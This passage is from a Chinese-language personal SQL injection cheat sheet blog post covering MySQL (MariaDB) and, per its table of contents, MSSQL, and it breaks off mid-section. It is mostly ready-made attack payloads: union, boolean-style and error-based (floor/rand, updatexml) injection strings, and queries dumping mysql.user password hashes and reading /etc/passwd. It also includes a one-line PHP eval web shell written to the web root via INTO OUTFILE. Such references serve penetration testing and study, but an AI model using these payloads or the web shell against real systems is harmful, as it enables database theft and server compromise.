class="post-toc-link" href="#Bool-盲注"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">Bool 盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#构造-bool-条件"><span class="post-toc-number">1.2.3.1.</span> <span class="post-toc-text">构造 bool 条件</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#构造逻辑判断"><span class="post-toc-number">1.2.3.2.</span> <span class="post-toc-text">构造逻辑判断</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用-order-by-盲注"><span class="post-toc-number">1.2.3.3.</span> <span class="post-toc-text">利用 order by 盲注</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#延时注入"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">延时注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#检测方法"><span class="post-toc-number">1.2.4.1.</span> <span class="post-toc-text">检测方法</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#payload"><span class="post-toc-number">1.2.4.2.</span> <span class="post-toc-text">payload</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#insert-update-delete-注入"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">insert&#x2F;update&#x2F;delete 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#insert"><span class="post-toc-number">1.2.5.1.</span> <span class="post-toc-text">insert</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#update"><span class="post-toc-number">1.2.5.2.</span> <span class="post-toc-text">update</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#delete"><span class="post-toc-number">1.2.5.3.</span> <span class="post-toc-text">delete</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Order-by-后注入"><span class="post-toc-number">1.2.6.</span> <span class="post-toc-text">Order by 后注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#报错注入-1"><span class="post-toc-number">1.2.6.1.</span> <span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#bool盲注-利用-rand"><span class="post-toc-number">1.2.6.2.</span> <span class="post-toc-text">bool盲注 利用 rand()</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#延时注入-order-by-if"><span class="post-toc-number">1.2.6.3.</span> <span class="post-toc-text">延时注入 order by if()</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Limit-注入"><span class="post-toc-number">1.2.7.</span> <span class="post-toc-text">Limit 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#报错注入-2"><span class="post-toc-number">1.2.7.1.</span> <span class="post-toc-text">报错注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Group-By-注入"><span class="post-toc-number">1.2.8.</span> <span class="post-toc-text">Group By 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#报错注入-3"><span class="post-toc-number">1.2.8.1.</span> <span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#延时注入-1"><span class="post-toc-number">1.2.8.2.</span> <span class="post-toc-text">延时注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Union-注入-1"><span class="post-toc-number">1.2.8.3.</span> <span class="post-toc-text">Union 注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#读写文件"><span class="post-toc-number">1.2.9.</span> <span class="post-toc-text">读写文件</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#load-file-读取"><span class="post-toc-number">1.2.9.1.</span> <span class="post-toc-text">load_file()读取</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#SELECT-导出"><span class="post-toc-number">1.2.9.2.</span> <span class="post-toc-text">SELECT 导出</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#写入-WebShell"><span class="post-toc-number">1.2.9.3.</span> <span class="post-toc-text">写入 WebShell</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#宽字节注入"><span class="post-toc-number">1.2.10.</span> <span class="post-toc-text">宽字节注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.2.10.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用"><span class="post-toc-number">1.2.10.2.</span> <span class="post-toc-text">利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#表名可控注入"><span class="post-toc-number">1.2.11.</span> <span class="post-toc-text">表名可控注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#表名不完全可控且DESC的表名含有反引号-SELECT的表名不含反引号"><span class="post-toc-number">1.2.11.1.</span> <span class="post-toc-text">表名不完全可控且DESC的表名含有反引号,SELECT的表名不含反引号</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#表名不完全可控且DESC的表名不含反引号-SELECT的表名含有反引号"><span class="post-toc-number">1.2.11.2.</span> <span class="post-toc-text">表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#无列名注入"><span class="post-toc-number">1.2.12.</span> <span class="post-toc-text">无列名注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#别名"><span class="post-toc-number">1.2.12.1.</span> <span class="post-toc-text">别名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#变量"><span class="post-toc-number">1.2.12.2.</span> <span class="post-toc-text">变量</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#可报错时爆表名、字段名、库名"><span class="post-toc-number">1.2.13.</span> <span class="post-toc-text">可报错时爆表名、字段名、库名</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#字段名"><span class="post-toc-number">1.2.13.1.</span> <span class="post-toc-text">字段名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#表名"><span class="post-toc-number">1.2.13.2.</span> <span class="post-toc-text">表名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#库名"><span class="post-toc-number">1.2.13.3.</span> <span class="post-toc-text">库名</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#约束攻击"><span class="post-toc-number">1.2.14.</span> <span class="post-toc-text">约束攻击</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#一次性注入出全部结构"><span class="post-toc-number">1.2.15.</span> <span class="post-toc-text">一次性注入出全部结构</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过技巧"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">绕过技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#空格替代"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">空格替代</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#绕过关键字"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">绕过关键字</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#双写关键字"><span class="post-toc-number">1.3.2.1.</span> <span class="post-toc-text">双写关键字</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#十六进制"><span class="post-toc-number">1.3.2.2.</span> <span class="post-toc-text">十六进制</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ASCII"><span class="post-toc-number">1.3.2.3.</span> <span class="post-toc-text">ASCII</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗号绕过"><span class="post-toc-number">1.3.2.4.</span> <span class="post-toc-text">逗号绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#比较符号绕过"><span class="post-toc-number">1.3.2.5.</span> <span class="post-toc-text">比较符号绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#字符串比较函数"><span class="post-toc-number">1.3.2.6.</span> <span class="post-toc-text">字符串比较函数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#字符串连接函数"><span class="post-toc-number">1.3.2.7.</span> <span class="post-toc-text">字符串连接函数</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#运算符"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">运算符</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#算术运算符"><span class="post-toc-number">1.3.3.1.</span> <span class="post-toc-text">算术运算符</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#比较运算符"><span class="post-toc-number">1.3.3.2.</span> <span class="post-toc-text">比较运算符</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逻辑运算符"><span class="post-toc-number">1.3.3.3.</span> <span class="post-toc-text">逻辑运算符</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#位运算符"><span class="post-toc-number">1.3.3.4.</span> <span class="post-toc-text">位运算符</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Reference</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MSSQL"><span class="post-toc-number">2.</span> <span class="post-toc-text">MSSQL</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Basic-1"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Basic</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#系统库"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">系统库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注释"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">注释</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查询语句"><span class="post-toc-number">2.1.3.</span> <span class="post-toc-text">查询语句</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#主机名"><span class="post-toc-number">2.1.3.1.</span> <span class="post-toc-text">主机名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#数据库版本"><span class="post-toc-number">2.1.3.2.</span> <span class="post-toc-text">数据库版本</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#数据库名"><span class="post-toc-number">2.1.3.3.</span> <span class="post-toc-text">数据库名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#数据库ip地址"><span class="post-toc-number">2.1.3.4.</span> <span class="post-toc-text">数据库ip地址</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#暴当前表中的列"><span class="post-toc-number">2.1.3.5.</span> <span class="post-toc-text">暴当前表中的列</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#暴任意表和列"><span class="post-toc-number">2.1.3.6.</span> <span class="post-toc-text">暴任意表和列</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#暴数据库数据"><span class="post-toc-number">2.1.3.7.</span> <span class="post-toc-text">暴数据库数据</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Exmaples"><span class="post-toc-number">2.1.3.8.</span> <span class="post-toc-text">Exmaples</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reference-1"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Reference</span></a></li></ol></li></ol><html><head></head><body><p>自用 Sqli 备忘录，随时更新</p><a id="more"></a><p>[TOC]</p><h1 id="Mysql-基于-10-3-11-MariaDB"><a href="#Mysql-基于-10-3-11-MariaDB" class="headerlink" title="Mysql(基于 10.3.11-MariaDB)"></a>Mysql(基于 10.3.11-MariaDB)</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h3><ul><li><p>VERSION()</p></li><li><p>@@VERSION</p></li><li><p>@@GLOBAL.VERSION</p></li></ul><h3 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h3><ul><li><p>USER()</p></li><li><p>CURRENT_USER()</p></li><li><p>SYSTEM_USER()</p></li><li><p>SESSION_USER()</p></li></ul><h3 id="当前使用的数据库"><a href="#当前使用的数据库" class="headerlink" title="当前使用的数据库"></a>当前使用的数据库</h3><ul><li><p>DATABASE()</p></li><li><p>SCHEMA()</p></li></ul><h3 id="当前的操作系统"><a href="#当前的操作系统" class="headerlink" title="当前的操作系统"></a>当前的操作系统</h3><ul><li>@@version_compile_os</li></ul><h3 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h3><ul><li>@@BASEDIR : mysql安装路径：</li><li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li><li>@@DATADIR : 数据存储路径：</li><li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li><li>@@LOG_ERROR : 错误日志文件路径：</li><li>@@PID_FILE : pid-file文件路径</li><li>@@BASEDIR : mysql安装路径：</li><li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li></ul><h3 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母/数字相关"></a>字母/数字相关</h3><ul><li>ASCII(): 获取字母的ascii码值</li><li>BIN(): 返回值的二进制串表示</li><li>CONV(): 进制转换</li><li>FLOOR(): 函数只返回整数部分，小数部分舍弃。</li><li>ROUND(): 函数四舍五入，大于0.5的部分进位，不到则舍弃。</li><li>LOWER()：转成小写字母</li><li>UPPER(): 转成大写字母</li><li>HEX():十六进制编码</li><li>UNHEX()：十六进制解码</li></ul><h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><ul><li>MID(column_name,start[,length]) start起始为1</li><li>LEFT(str,length) length为从左边开始要返回的字符数</li><li>RIGHT(str,length). length为从右边开始要返回的字符数</li><li>SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值</li><li>SUBSTRING(str,pos,len). 与subsets()相同</li></ul><h3 id="‘注释’"><a href="#‘注释’" class="headerlink" title="‘注释’"></a>‘注释’</h3><ul><li><code>— -</code>(–后面有个空格)<ul><li><code>select * from message ;-- -where id =1;</code></li></ul></li></ul><hr><ul><li><code>select * from message ;--where id =1;</code><ul><li>—+</li></ul></li><li><code>select * from message ;—+where id =1;</code><ul><li>#</li></ul></li><li><code>select * from message ;#where id =1;</code><ul><li>%00</li></ul></li><li><code>select * from message ;%00where id =1;</code><ul><li>/**/</li></ul></li><li><code>select * from message ;/*where id =1;*/</code></li></ul><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p>查找所有用户</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> mysql.user;</span><br></pre></td></tr></tbody></table></figure><p></p><p>用户hash：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">'root'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>数据库</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span>(database_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats;</span><br><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span>(Db) <span class="hljs-keyword">from</span> mysql.db;</span><br></pre></td></tr></tbody></table></figure><p></p><p>表名：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'table_name'</span>;</span><br><span class="line"></span><br><span class="line">//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.table_constraints <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'table_name_xxx'</span>;</span><br><span class="line"></span><br><span class="line">//mysql&gt;5.6</span><br><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span>(table_name) <span class="hljs-keyword">from</span> mysql.innodb_index_stats;</span><br></pre></td></tr></tbody></table></figure><p></p><p>列名:</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'column_name_xxx'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>读文件：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'/etc/passwd'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>写文件：</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/html/shell.php';</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h2><h3 id="Union-注入"><a href="#Union-注入" class="headerlink" title="Union 注入"></a>Union 注入</h3><h4 id="判断是否可以注入"><a href="#判断是否可以注入" class="headerlink" title="判断是否可以注入"></a>判断是否可以注入</h4><p>假设有: <code>www.test.com/?id=1</code></p><h4 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h4><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?<span class="hljs-attribute">id</span>=1+1</span><br><span class="line">?<span class="hljs-attribute">id</span>=-1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1</span><br><span class="line">?<span class="hljs-attribute">id</span>=-1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">10-2</span>=8</span><br><span class="line">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2</span><br><span class="line">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="hljs-number">1</span>'</span><br><span class="line">?id=<span class="hljs-number">1</span><span class="hljs-string">"</span></span><br><span class="line"><span class="hljs-string">?id=1' and '1'='1</span></span><br><span class="line"><span class="hljs-string">?id=1"</span> and <span class="hljs-string">"1"</span>=<span class="hljs-string">"1</span></span><br><span class="line"><span class="hljs-string">?id=1')</span></span><br><span class="line"><span class="hljs-string">?id=1"</span>)</span><br><span class="line">?id=<span class="hljs-number">1</span>') and '<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></span><br><span class="line">?id=<span class="hljs-number">1</span><span class="hljs-string">") and "</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="查询列数"><a href="#查询列数" class="headerlink" title="查询列数"></a>查询列数</h4><p>用<code>UNION SELECT</code>注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span> <span class="hljs-comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">10</span> <span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">5</span>  <span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span>  <span class="hljs-comment">#</span></span><br><span class="line">....</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">password</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="过滤了逗号的-union-注入"><a href="#过滤了逗号的-union-注入" class="headerlink" title="过滤了逗号的 union 注入"></a>过滤了逗号的 union 注入</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from (select version())a join (select database())b join (select database())c;</span><br><span class="line">+<span class="hljs-comment">-----------------+------+------+</span></span><br><span class="line">| 1               | 2    | 3    |</span><br><span class="line">+<span class="hljs-comment">-----------------+------+------+</span></span><br><span class="line">| 1               | 2    | 3    |</span><br><span class="line">| 10.3.11-MariaDB | test | test |</span><br><span class="line">+<span class="hljs-comment">-----------------+------+------+</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>MYSQL报错注入大体可以分为以下几类：</p><ul><li>BIGINT等数据类型溢出</li><li>xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>空间数据类型函数错误</li></ul><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><h5 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h5><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">OR</span> (SELECT 8627 <span class="hljs-keyword">FROM</span>(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)<span class="hljs-number">*2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS<span class="hljs-built_in"> GROUP </span>BY x)a)</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>floor：函数只返回整数部分，小数部分舍弃。</li><li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li></ul><h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p><p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot <span class="hljs-keyword">use</span> a <span class="hljs-keyword">column</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">values</span> <span class="hljs-keyword">in</span> an <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> clause, because <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> would <span class="hljs-keyword">evaluate</span> the <span class="hljs-keyword">column</span> multiple times. However, you can retrieve <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> random <span class="hljs-keyword">order</span> <span class="hljs-keyword">like</span> this:</span><br></pre></td></tr></tbody></table></figure><p></p><p>官方文档中的意思是：在<code>where</code>语句中，<code>where</code>每执行一次，<code>rand()</code>函数就会被计算一次。<code>rand()</code>不能作为<code>order by</code>的条件字段，同理也不能作为<code>group by</code>的条件字段。</p><p>因此在 mysql 中，可以构造一个值不确定而有可重复的字段作为<code>group by</code>的条件字段，这是就可以报出类似于<code>Duplicate entry ‘…’ for key ‘group_key’</code>的错误</p><h4 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h4><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是<code>ExtractValue()</code>和<code>UpdateXML()</code></p><p>因此在mysql 小于5.1.5中不能用<code>ExtractValue</code>和<code>UpdateXML</code>进行报错注入。</p><h5 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h5><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(SELECT @@version),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><h5 id="注入原理-1"><a href="#注入原理-1" class="headerlink" title="注入原理"></a>注入原理</h5><p></p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML<span class="hljs-number">_</span>document, XPath<span class="hljs-number">_</span>string, <span class="hljs-keyword">new</span><span class="hljs-number">_</span><span class="hljs-keyword">value</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc</li><li>第二个参数：XPath_string ( Xpath 格式的字符串)</li><li>第三个参数：new_value，String 格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值</li></ul><p>返回结果为连接参数产生的字符串。如有任何一个参数为<code>NULL</code> ，则返回值为<code>NULL</code>。</p><p>通过查询<code>@@version</code>,返回版本。然后<code>CONCAT</code>将其字符串化。因为<code>UPDATEXML</code>第二个参数需要<code>Xpath</code>格式的字符串,所以不符合要求，然后报错。</p><h4 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h4><h5 id="注入语句-2"><a href="#注入语句-2" class="headerlink" 